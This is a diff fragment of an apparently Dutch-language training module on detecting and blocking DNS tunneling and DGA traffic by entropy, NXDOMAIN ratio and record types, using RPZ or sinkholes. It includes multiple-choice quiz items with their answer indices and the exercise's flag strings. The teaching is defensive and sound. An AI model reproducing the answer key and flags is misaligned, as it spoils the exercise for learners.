-        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{stille_uitgang_betrapt}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{stille_uitgang_betrapt}.' },
-      ],
-    },
-    {
-      title: 'Taak 3 — Detecteren en blokkeren',
-      content: `
-        <p>Nu je het patroon kent, hoe vang je het structureel? DNS-misbruik detecteer je niet aan één query, maar aan
-        <strong>patronen over tijd</strong>:</p>
-        <ul>
-          <li><strong>Lengte &amp; entropie</strong> van subdomeinen — meet hoe lang en hoe willekeurig ze zijn (tunneling
-          valt op).</li>
-          <li><strong>Volume per domein</strong> — veel queries naar één zelden-bezocht domein is verdacht.</li>
-          <li><strong>NXDOMAIN-ratio</strong> — een plotselinge piek wijst op een DGA.</li>
-          <li><strong>Recordtypes</strong> — ongewoon veel TXT (of NULL) is een rode vlag.</li>
-        </ul>
-        <p>Blokkeren doe je op de resolver met een <strong>RPZ</strong> of <strong>sinkhole</strong>: je weigert het
-        kwaadaardige domein of leidt het om naar een onschadelijk adres, zodat je besmette machines ook meteen ziet.</p>
-        <div class="callout tip"><strong>Beloning:</strong> meet patronen, niet losse queries. Vlag: <code>NM{meet_de_patronen}</code>.</div>
-      `,
-      questions: [
-        { q: 'Welke maat helpt het best om DNS-tunneling te detecteren?', options: ['Lengte en entropie van de subdomeinen', 'De kleur van het domein', 'Het aantal letters in de TLD', 'De tijd van de dag'], answer: 0, explain: 'Tunneling-subdomeinen zijn lang en willekeurig; lengte/entropie meten vangt ze automatisch.' },
-        { q: 'Een plotselinge piek in de NXDOMAIN-ratio wijst vooral op…', options: ['Een DGA die domeinen aftast op zoek naar zijn C2', 'Normaal browsen', 'Een software-update', 'Een trage resolver'], answer: 0, explain: 'Veel mislukte lookups op willekeurige namen is het handtekeningpatroon van een DGA.' },
-        { q: 'Hoe blokkeer je een kwaadaardig DNS-domein op de resolver?', options: ['Met een RPZ of sinkhole (weigeren of omleiden naar een onschadelijk adres)', 'Door de werkplek uit te zetten', 'Door DNS helemaal te blokkeren', 'Door het wachtwoord te wijzigen'], answer: 0, explain: 'Een RPZ/sinkhole blokkeert het domein centraal én onthult welke machines het nog proberen (besmet).' },
-        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{meet_de_patronen}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{meet_de_patronen}.' },
       ],
     },
   ],
